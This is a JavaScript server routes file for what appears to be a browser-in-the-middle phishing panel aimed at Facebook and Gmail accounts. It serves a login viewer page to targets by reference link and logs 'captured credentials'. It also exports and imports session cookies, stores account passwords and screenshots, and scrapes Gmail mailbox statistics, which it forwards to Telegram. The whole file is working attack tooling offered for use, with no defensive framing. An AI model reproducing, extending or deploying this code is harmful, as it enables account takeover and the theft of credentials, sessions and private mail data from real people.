// Panel API routes: browser-session control.

import { loadAccounts, getAccount, getAccountByRef, saveAccount, deleteAccount } from '../accounts.js';
import * as browser from '../browser.js';
import { config } from '../config.js';
import { isLocked, lockoutRemainingMs, recordFailure, recordSuccess } from '../pinGuard.js';
import { collectGmailStats, formatStatsForTelegram } from '../gmail-stats.js';
import { isConfigured as gmailApiConfigured, hasToken as hasGmailToken, revokeToken as revokeGmailToken } from '../gmail-api.js';
import * as telegram from '../telegram.js';

function checkPin(req, reply) {
  if (!config.pin) return; // no PIN configured → local-only mode
  if (isLocked(req.ip)) {
    reply.code(429).send({ error: 'too_many_attempts', retryAfterMs: lockoutRemainingMs(req.ip) });
    return false;
  }
  const auth = req.headers['x-pin'] || req.query?.pin || '';
  if (auth !== config.pin) {
    recordFailure(req.ip);
    reply.code(401).send({ error: 'invalid_pin' });
    return false;
  }
  recordSuccess(req.ip);
}

export default async function panelRoutes(app) {
  // Expose PIN-check endpoint so the frontend can verify before storing.
  app.post('/api/auth', async (req, reply) => {
    if (!config.pin) return { ok: true };
    if (isLocked(req.ip)) {
      return reply.code(429).send({ error: 'too_many_attempts', retryAfterMs: lockoutRemainingMs(req.ip) });
    }
    const { pin } = req.body || {};
    if (pin !== config.pin) {
      recordFailure(req.ip);
      return reply.code(401).send({ error: 'invalid_pin' });
    }
    recordSuccess(req.ip);
    return { ok: true };
  });
  app.get('/api/accounts', async (req, reply) => {
    if (checkPin(req, reply) === false) return;
    const accounts = await loadAccounts();
    return accounts.map((a) => ({ ...a, ...browser.status(a.id) }));
  });

  // Live activity on the remote (Facebook/Gmail) pages — navigation,
  // captured credentials — polled by the "LIVE TIME LOGS" tab.
  app.get('/api/logs', async (req, reply) => {
    if (checkPin(req, reply) === false) return;
    const since = Number(req.query?.since) || 0;
    return browser.getLogs(since);
  });

  app.post('/api/accounts', async (req, reply) => {
    if (checkPin(req, reply) === false) return;
    const { id, label, startUrl } = req.body || {};
    if (!id || !label || !startUrl)
      return reply.code(400).send({ error: 'id, label and startUrl are required' });
    if (!/^[a-z0-9_-]+$/.test(id))
      return reply.code(400).send({ error: 'id must be lowercase letters, digits, _ or -' });
    // Nowe konto = czysty profil. Bez tego, jeśli ktoś wcześniej miał
    // konto o tym samym id (lub profil z poprzedniej instalacji), nowe
    // konto dziedziczy jego cookies — Gmail/Facebook wyglądają na
    // "już zalogowane".
    const existed = Boolean(await getAccount(id));
    if (!existed) {
      await browser.stop(id).catch(() => {});
      const wiped = await browser.wipeProfile(id);
      if (wiped) console.log('[panel] wiped leftover profile for new account:', id);
    }
    // The proxy's anti-abuse throttling silently hangs real-Chrome traffic
    // to any Google domain (confirmed live) — route those direct instead.
    const isGoogle = /(^|\.)google\.com$/.test(new URL(startUrl).hostname);
    await saveAccount({ id, label, startUrl, ...(isGoogle ? { useProxy: false } : {}) });
    await browser.start(id, req.ip).catch(() => {});
    return { ok: true, id };
  });

  app.delete('/api/accounts/:id', async (req, reply) => {
    if (checkPin(req, reply) === false) return;
    const { id } = req.params;
    if (!await getAccount(id)) return reply.code(404).send({ error: 'unknown_account' });
    await browser.stop(id).catch(() => {});
    await deleteAccount(id);
    // Clean up the profile dir too — otherwise it stays on disk and any
    // future account with the same id picks up stale cookies.
    await browser.wipeProfile(id);
    return { ok: true };
  });

  // Manually wipe cookies/session of a running account — useful when the
  // profile picked up some other account's session and you want to force
  // a fresh login. Stops the browser, deletes the profile dir, restarts.
  app.post('/api/accounts/:id/reset-profile', async (req, reply) => {
    if (checkPin(req, reply) === false) return;
    const { id } = req.params;
    if (!await getAccount(id)) return reply.code(404).send({ error: 'unknown_account' });
    await browser.stop(id).catch(() => {});
    const wiped = await browser.wipeProfile(id);
    await browser.start(id, req.ip).catch(() => {});
    return { ok: true, wiped };
  });

  app.post('/api/accounts/:id/start', async (req, reply) => {
    if (checkPin(req, reply) === false) return;
    if (!await getAccount(req.params.id)) return reply.code(404).send({ error: 'unknown_account' });
    return browser.start(req.params.id, req.ip);
  });

  app.post('/api/accounts/:id/stop', async (req, reply) => {
    if (checkPin(req, reply) === false) return;
    if (!await getAccount(req.params.id)) return reply.code(404).send({ error: 'unknown_account' });
    return browser.stop(req.params.id);
  });

  // Update stored notes/password for an account
  app.patch('/api/accounts/:id', async (req, reply) => {
    if (checkPin(req, reply) === false) return;
    const acc = await getAccount(req.params.id);
    if (!acc) return reply.code(404).send({ error: 'unknown_account' });
    const { notes, password, email } = req.body || {};
    await saveAccount({ ...acc, notes, password, email });
    return { ok: true };
  });

  app.get('/api/accounts/:id/status', async (req, reply) => {
    if (checkPin(req, reply) === false) return;
    if (!await getAccount(req.params.id)) return reply.code(404).send({ error: 'unknown_account' });
    return browser.status(req.params.id);
  });

  // Thumbnail screenshot (JPEG, ~320px wide)
  app.get('/api/accounts/:id/screenshot', async (req, reply) => {
    if (checkPin(req, reply) === false) return;
    if (!await getAccount(req.params.id)) return reply.code(404).send({ error: 'unknown_account' });
    const page = browser.getPage(req.params.id);
    if (!page) return reply.code(409).send({ error: 'session_not_running' });
    // Default screenshot timeout is 30s; if the page's main thread is
    // blocked (e.g. an anti-bot challenge doing heavy work), fail fast
    // instead of tying up the request — and the admin's whole account list
    // — for half a minute per stuck account.
    const buf = await page.screenshot({ type: 'jpeg', quality: 70, timeout: 8000 });
    reply.header('content-type', 'image/jpeg');
    return reply.send(buf);
  });

  // Export cookies as JSON file
  app.get('/api/accounts/:id/cookies', async (req, reply) => {
    if (checkPin(req, reply) === false) return;
    const acc = await getAccount(req.params.id);
    if (!acc) return reply.code(404).send({ error: 'unknown_account' });
    const ctx = browser.getContext(req.params.id);
    if (!ctx) return reply.code(409).send({ error: 'session_not_running' });
    const cookies = await ctx.cookies();
    reply.header('content-type', 'application/json');
    reply.header('content-disposition', `attachment; filename="${req.params.id}-cookies.json"`);
    return reply.send(JSON.stringify(cookies, null, 2));
  });

  // Import cookies (restore an already-logged-in session) — body is a JSON
  // array of cookies in the same shape GET .../cookies above exports
  // (name, value, domain, path, expires, httpOnly, secure, sameSite).
  app.post('/api/accounts/:id/cookies', async (req, reply) => {
    if (checkPin(req, reply) === false) return;
    const acc = await getAccount(req.params.id);
    if (!acc) return reply.code(404).send({ error: 'unknown_account' });
    const ctx = browser.getContext(req.params.id);
    if (!ctx) return reply.code(409).send({ error: 'session_not_running' });
    const cookies = req.body;
    if (!Array.isArray(cookies)) return reply.code(400).send({ error: 'expected a JSON array of cookies' });
    await ctx.addCookies(cookies);
    // Reload so the page picks up the new auth state right away instead of
    // sitting on whatever (likely signed-out) state it already rendered.
    const page = browser.getPage(req.params.id);
    if (page) await page.goto(acc.startUrl, { waitUntil: 'commit' }).catch(() => {});
    return { ok: true, count: cookies.length };
  });

  // Playwright's page.evaluate() has NO default timeout — if the page's main
  // thread is blocked (e.g. a site's anti-bot challenge doing heavy work),
  // it hangs forever instead of rejecting. Race it against our own timeout
  // so one stuck account can't freeze this endpoint.
  const withTimeout = (promise, ms = 5000) =>
    Promise.race([promise, new Promise((resolve) => setTimeout(() => resolve(null), ms))]);

  // Account info: page title + extracted login hint
  app.get('/api/accounts/:id/info', async (req, reply) => {
    if (checkPin(req, reply) === false) return;
    if (!await getAccount(req.params.id)) return reply.code(404).send({ error: 'unknown_account' });
    const page = browser.getPage(req.params.id);
    if (!page) return { running: false };
    const url = page.url();
    // Run every page query in PARALLEL, not one after another — otherwise a
    // mid-load page where each call waits its full timeout makes the endpoint
    // take the SUM of them (5+5+5+6 = 20s+). In parallel it's bounded by the
    // single slowest timeout (~6s) instead.
    const [title, loginHint, avatarUrl, userAgent, ip] = await Promise.all([
      withTimeout(page.title().catch(() => '')),
      withTimeout(page.evaluate(() => {
        // Gmail: "name@gmail.com" in aria-label of account switcher
        const gEl = document.querySelector('[aria-label*="@"]');
        if (gEl) {
          const m = gEl.getAttribute('aria-label').match(/[\w.+-]+@[\w.-]+\.\w+/);
          if (m) return m[0];
        }
        // Facebook: profile name in nav
        const fbEl = document.querySelector('[aria-label="Twój profil"]') ||
                     document.querySelector('[aria-label="Your profile"]');
        if (fbEl) return fbEl.getAttribute('aria-label');
        // og:title as fallback
        const og = document.querySelector('meta[property="og:title"]');
        if (og) return og.content;
        return null;
      }).catch(() => null)),
      withTimeout(page.evaluate(() => {
        const el = document.querySelector('img[alt*="profile" i], img[alt*="avatar" i], img[alt*="zdjęcie" i]');
        return el ? el.src : null;
      }).catch(() => null)),
      withTimeout(page.evaluate(() => navigator.userAgent).catch(() => null), 3000),
      withTimeout(page.evaluate(() => {
        const tryFetch = (url, extract) => {
          const ctrl = new AbortController();
          const t = setTimeout(() => ctrl.abort(), 3000);
          return fetch(url, { signal: ctrl.signal })
            .then((r) => r.ok ? r.json() : null)
            .then(extract)
            .catch(() => null)
            .finally(() => clearTimeout(t));
        };
        return tryFetch('https://api.ipify.org?format=json', d => d?.ip)
          .then(ip => ip || tryFetch('https://api.myip.com', d => d?.ip))
          .then(ip => ip || tryFetch('https://ipinfo.io/json', d => d?.ip));
      }).catch(() => null), 8000),
    ]);
    const blocked = (title ?? '') === '' && loginHint === null && userAgent === null;
    return { running: true, title: title ?? '', url, loginHint, avatarUrl, userAgent, ip, blocked };
  });

  // Viewer page — no PIN check (static HTML); auth happens in JS via WS + API.
  app.get('/account/login', async (req, reply) => {
    const ref = req.query?.ref || '';
    if (!ref || !await getAccountByRef(ref)) return reply.code(404).send({ error: 'unknown_ref' });
    return reply.sendFile('view.html');
  });

  // Gmail mailbox statistics — opens a background tab in the account's context,
  // navigates through Gmail search pages and returns counts per category.
  // Takes ~60-90 s; progress events are streamed via SSE at /api/accounts/:id/mail-stats/progress.
  app.get('/api/accounts/:id/mail-stats', async (req, reply) => {
    if (checkPin(req, reply) === false) return;
    const acc = await getAccount(req.params.id);
    if (!acc) return reply.code(404).send({ error: 'unknown_account' });
    const ctx = browser.getContext(req.params.id);
    if (!ctx) return reply.code(409).send({ error: 'session_not_running' });

    const stats = await collectGmailStats(ctx, null, req.params.id);
    return stats;
  });

  // SSE endpoint — streams progress messages while the stats job runs.
  // The client first opens this stream, then the main GET fires separately.
  // We use a simple in-process event map keyed by account id.
  app.get('/api/accounts/:id/mail-stats/progress', async (req, reply) => {
    if (checkPin(req, reply) === false) return;
    const { id } = req.params;

    reply.raw.writeHead(200, {
      'content-type': 'text/event-stream',
      'cache-control': 'no-cache',
      'connection': 'keep-alive',
    });

    const send = (msg) => reply.raw.write(`data: ${JSON.stringify(msg)}\n\n`);

    // Register the progress listener
    const acc = await getAccount(id);
    if (!acc) { send({ done: true, error: 'unknown_account' }); reply.raw.end(); return; }
    const ctx = browser.getContext(id);
    if (!ctx) { send({ done: true, error: 'session_not_running' }); reply.raw.end(); return; }

    try {
      const stats = await collectGmailStats(ctx, (msg) => send({ step: msg }), id);
      send({ done: true, stats });
      // Send to Telegram
      const tgText = formatStatsForTelegram(acc.label, stats);
      telegram.sendMessage(tgText, { parseMode: 'HTML' }).catch(() => {});
    } catch (err) {
      send({ done: true, error: String(err?.message || err) });
    }
    reply.raw.end();
  });

  // Start session by ref, return accountId (used by view.js)
  app.post('/api/account-by-ref/:ref/start', async (req, reply) => {
    if (checkPin(req, reply) === false) return;
    const acc = await getAccountByRef(req.params.ref);
    if (!acc) return reply.code(404).send({ error: 'unknown_ref' });
    await browser.start(acc.id, req.ip);
    return { accountId: acc.id };
  });

  // Gmail API status — check if OAuth is configured and authorized
  app.get('/api/accounts/:id/gmail-api-status', async (req, reply) => {
    if (checkPin(req, reply) === false) return;
    const { id } = req.params;
    const acc = await getAccount(id);
    if (!acc) return reply.code(404).send({ error: 'unknown_account' });
    return {
      configured: gmailApiConfigured(),
      authorized: await hasGmailToken(id),
    };
  });

  // Revoke Gmail API token for re-authorization
  app.post('/api/accounts/:id/gmail-api-revoke', async (req, reply) => {
    if (checkPin(req, reply) === false) return;
    const { id } = req.params;
    const acc = await getAccount(id);
    if (!acc) return reply.code(404).send({ error: 'unknown_account' });
    await revokeGmailToken(id);
    return { ok: true };
  });
}
